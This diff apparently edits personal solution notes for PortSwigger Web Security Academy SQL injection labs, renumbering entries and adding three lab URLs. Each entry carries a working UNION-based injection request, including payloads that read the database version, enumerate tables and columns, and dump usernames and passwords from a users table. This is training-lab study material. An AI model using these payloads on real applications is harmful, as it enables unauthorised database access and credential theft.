@@ -14,7 +14,7 @@
 3. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
    /filter?category=%27+UNION+SELECT+BANNER,NULL+FROM+v$version--
    
-3. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+4. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
      GET /filter?category='+UNION+SELECT+@@version,+NULL# HTTP/2
 
 5. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
@@ -29,4 +29,12 @@
      GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_BEQQVS'--
      GET /filter?category='+UNION+SELECT+USERNAME_YUOEWA,PASSWORD_XHXKTJ+FROM+USERS_BEQQVS--
    
-8. sd
+7. https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+     GET /filter?category=Pets'+UNION+SELECT+NULL,'2NSEW7',NULL--
+   
+8.  https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+     GET /filter?category=Pets'+UNION+SELECT+username,password+FROM+users--
+    
+9.  https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+     GET /filter?category=Pets'+UNION+SELECT+NULL,username||password+FROM+users--
+10.  
